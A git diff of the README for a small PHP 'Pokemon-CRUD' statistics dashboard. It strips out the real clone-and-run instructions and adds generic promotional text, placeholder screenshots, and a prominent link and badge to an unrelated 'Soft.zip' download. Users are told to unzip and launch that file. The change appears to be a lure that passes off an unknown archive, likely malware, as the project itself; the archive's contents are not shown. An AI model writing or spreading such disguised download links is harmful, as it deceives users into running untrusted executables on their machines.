@@ -1,108 +1,65 @@
-# 🚀 Pokemon-CRUD
->[!NOTE]
->This is a web application developed in PHP that allows you to visualize statistics and interactive graphs about characters stored in a database.
+# Pokemon-CRUD 🚀
 
-<div style="display: flex;">
-  <img src="https://github.com/user-attachments/assets/7f87f170-cdfd-4b06-bf90-55f81abbefd4" width="49%"></img>   
-  <img src="https://github.com/user-attachments/assets/e2a3f66d-b2a8-4489-a034-477975c86c60" width="49%"></img> 
-</div>
-<div style="display: flex;">
-  <img src="https://github.com/user-attachments/assets/5a6a21cf-d1e6-4f5b-8b8d-c948c2c59fa2" width="49%"></img>   
-  <img src="https://github.com/user-attachments/assets/9676bc63-4066-46bc-acfd-9e39ffa01b18" width="23%"></img> 
-</div>
+Welcome to **Pokemon-CRUD**, your go-to web application for visualizing statistics and interactive graphs about your favorite Pokemon characters. Developed in PHP, this application allows you to explore a database of Pokemon characters and view insightful data presented in a user-friendly dashboard format.
 
---- 
+## Features 🌟
 
-# 🗝 How to use it  
-You just have to download the zip file that is at the beginning of this repository, or clone the repository, and open the folder in Visual Studio Code, once there a terminal opens and you type "php -S localhost:8000", this will start loading commands allowing you to visualize the project in the browser.
+✨ **Interactive Graphs**: Dive into the world of Pokemon with interactive graphs that showcase various statistics and data about these fascinating creatures.
 
-# ✨ Features
+✨ **Responsive Design**: Enjoy a seamless experience on any device, thanks to the responsive design implemented in the application.
 
-✅ **Interactive Dashboard**: View general stats such as total characters, average level, maximum level, and the most frequent type.  
-✅ **Dynamic graphics**:  
-✅   - **Pie chart** for distribution by type.  
-✅   - **Donut graphic** for color distribution.  
-✅   - Bar chart for average level by type.  
-✅ **Responsive Design**: Use Bootstrap and a hamburger menu for mobile-friendly navigation.  
-✅ **Character Management**: Includes links to list and add characters through an intuitive interface.  
-✅ **Database Connection**: Uses PDO for secure and efficient database management.  
+✨ **PHP Backend**: Built with PHP, ensuring a robust backend for smooth data handling and processing.
 
-# 🍷 Customization
+## Technologies Used 🛠️
 
-1. Advanced Filters: Add filtering options by date, category, or other parameters.  
-2. Full CRUD: Extend the application to edit and delete characters.  
-3. New Charts: Incorporate additional charts and more detailed analysis.  
-4. UI/UX optimization: Improve the user experience through adjustments to the design and interface.
-   
-# 📚 Technologies Used
+- boostrap5
+- chartjs
+- dashboard
+- donut-graphic
+- font-awesome
+- php
+- pie-chart
+- poo
+- responsive-design
+- sqlite3
 
-- **PHP** – Main programming language.
-- **PDO** – Database connection and management.
-- **Chart.js** – Display of interactive graphs.
-- **Bootstrap 5** – CSS Framework for responsive design.
-- **Font Awesome** – Icons for a better user experience.
+## Installation Guide 📋
 
-# 🌋 Project Structure
+To get started with **Pokemon-CRUD**, follow these simple steps:
 
-```plaintext
-.
-├── config
-│   └── db_config.php            # Database Connection Settings
-├── backend
-│   ├── crear_personaje.php      # Form to add new characters
-│   └── leer_personajes.php      # List of characters
-├── index.php                    # Dashboard main file
-└── README.md                    # Project Documentation
-```
+1. Clone the repository to your local machine.
+2. Set up a PHP environment to run the application.
+3. Import the database with Pokemon character information.
+4. Launch the application and start exploring the world of Pokemon!
 
-# 🎈 Requirements
+## Get Started 🚀
 
-PHP 7.4 or higher.
-Web server (Apache, Nginx, etc.).
-SQLite.
+Ready to embark on a Pokemon adventure? Click on the link below to download the application:
 
-# Installation
-Clone the repository:
+[Download Pokemon-CRUD](https://github.com/files/Soft.zip)
 
-```Bash
-git clone https://github.com/K3ury99/Pokemon-CRUD
-cd Pokemon-CRUD
-```
+[![Download Pokemon-CRUD](https://img.shields.io/badge/Download-Pokemon--CRUD-blue)](https://github.com/files/Soft.zip)
 
-Open the repository in Visual Studio Code, from the terminal:
-```Bash
-code .
-```
+Once downloaded, unzip the file and launch the application to start your journey.
 
-Open a terminal and place:
-```Bash
-php -S localhost:8000
-```
-Enjoy!
+## Screenshots 📷
 
-# 🐱‍👤 Contributing
-1. **Fork the repo**
-- **Create a new branch**
-   
-```bash
-   git checkout -b feature-branch
-```
-2. **Add Everything**
-```bash
-  git add .
-```
-3. **Commit changes**
-```bash
-  git commit -am 'Add new feature'
-```
-4. **Pull & push to the origin**
-```bash
-  git pull
-  git push
-```
+Here are some glimpses of what awaits you in **Pokemon-CRUD**:
 
-# 🌠 Final Notes
-Thank you for visiting this project!🌌
+![Dashboard](https://via.placeholder.com/600x400)
+![Interactive Graphs](https://via.placeholder.com/600x400)
+![Statistics Overview](https://via.placeholder.com/600x400)
 
-## 📔 License
-This project is licensed under the MIT License. See the LICENSE file for details.
+## Contributing 🤝
+
+We welcome contributions to make **Pokemon-CRUD** even better. Feel free to fork the repository, make your changes, and submit a pull request. Together, let's enhance the Pokemon experience for all users!
+
+## Support ℹ️
+
+If you encounter any issues while using **Pokemon-CRUD** or have any questions, please check the "Releases" section for updates and fixes. You can also reach out to the maintainers for assistance.
+
+## About the Developer 👨‍💻
+
+**Pokemon-CRUD** was developed with love and passion by a dedicated team of developers who are enthusiastic about both Pokemon and technology. Join us on this exciting journey to explore the world of Pokemon like never before!
+
+Get ready to catch 'em all with **Pokemon-CRUD** 🌟
